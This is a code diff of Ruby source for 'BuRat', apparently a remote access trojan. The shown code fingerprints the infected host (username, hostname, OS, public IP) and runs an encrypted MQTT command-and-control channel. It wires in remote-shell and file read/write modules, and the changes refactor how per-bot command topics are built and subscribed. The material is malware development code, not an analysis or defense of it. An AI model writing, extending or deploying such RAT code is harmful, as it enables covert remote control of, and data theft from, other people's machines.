@@ -1,7 +1,8 @@
-require 'securerandom'
-require 'os'
 require 'open-uri'
+require 'os'
+require 'ostruct'
 require 'paho-mqtt'
+require 'securerandom'
 
 require_relative 'internals/encryption'
 require_relative 'internals/serialization'
@@ -11,11 +12,13 @@ require_relative 'bushido/remoteshell/buremoteshell'
 class BuRat
   attr_reader :id, :host, :os, :ip
   attr_accessor :status, :internals, :bushido
+  attr_accessor :topics
   def initialize()
     @id = SecureRandom.hex(2)
     @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
     @os = (OS.windows? ? `ver` : `uname -sr`).strip
-    @ip = open('http://whatismyip.akamai.com').read
+    #@ip = open('http://whatismyip.akamai.com').read
+    @ip = 'test'
     @status = :offline
     @internals = {
       :mqtt           => PahoMqtt::Client.new,
@@ -29,6 +32,7 @@ class BuRat
       :filerw         => Bushido::BuFileReadWrite.new
     }
     @cmd_topics = []
+    @topics
   end
 
   def profile()
@@ -51,27 +55,37 @@ class BuRat
   	return data
   end
 
-  def deseen(data)
+  def decryse(data)
   	data = @internals[:aes].decrypt(data)
   	data = @internals[:serialization].deserialize(data)
-  	return data
+  	return OpenStruct.new(data)
   end
 
   def add_topic_callback(topic, &block)
-    #topic = digest_topic(topic)
+    topic = @topics[topic]
     @cmd_topics.push([topic, 2])
     @internals[:mqtt].add_topic_callback(topic, block)
   end
 
   def publish(id, topic, payload="", retain=false, qos=0)
-    topic = topic.dup
+    topic = @topics[topic].dup
     topic['+'] = id
-    #topic = digest_topic(topic)
     @internals[:mqtt].publish(topic, payload, retain, qos)
   end
 
   def subscribe()
     @internals[:mqtt].subscribe(@cmd_topics)
+  end
+
+  def add_topics(topics)
+    topics.each do |key, value|
+      if value.include?('BURAT') then
+        value['BURAT'] = @id
+        topics[key] = value
+        #topics[key] = digest_topic(value)
+      end
+    end
+    @topics = topics
   end
 
   private
